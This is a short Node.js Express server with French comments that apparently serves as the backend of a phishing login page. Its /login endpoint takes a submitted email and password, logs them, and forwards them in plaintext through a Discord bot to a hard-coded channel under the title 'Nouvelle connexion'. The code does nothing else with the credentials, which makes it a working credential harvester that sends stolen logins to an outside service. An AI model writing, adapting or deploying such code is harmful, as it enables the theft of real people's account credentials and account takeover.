require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000; // Utilisez le port fourni par Heroku, ou le port 3000 par défaut

const { Client, GatewayIntentBits, EmbedBuilder, Partials } = require('discord.js');

const discordBot = new Client({ intents: [GatewayIntentBits.Guilds], partials: [Partials.Channel] });
discordBot.login(process.env.TOKEN);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const { email, password } = req.body;
  
    console.log('Email:', email);
    console.log('Mot de passe:', password);
  
    // Stocker les données dans des variables distinctes
    const userEmail = email;
    const userPassword = password;
  
    // Envoyer les données à Discord
    sendToDiscord(userEmail, userPassword);
  
    res.send('Données envoyées avec succès à Discord!');
});

function sendToDiscord(email, password) {
    const channelId = '1211381136207384638'; // Remplacez par l'ID de votre canal Discord
  
    const channel = discordBot.channels.cache.get(channelId);

    // Création de l'embed Discord avec les données de l'utilisateur
    const embed = new EmbedBuilder()
        .setColor(0x0099FF)
        .setTitle('Nouvelle connexion')
        .setDescription(`Email: ${email}\nMot de passe: ${password}`);
    
    // Envoi de l'embed à Discord
    if (channel) {
        channel.send({ embeds: [embed] });
        console.log('Message envoyé à Discord avec succès!');
    } else {
        console.error('Le canal Discord spécifié est introuvable!');
    }
}

app.listen(port, () => {
    console.log(`Serveur backend en cours d'exécution sur le port ${port}`);
});

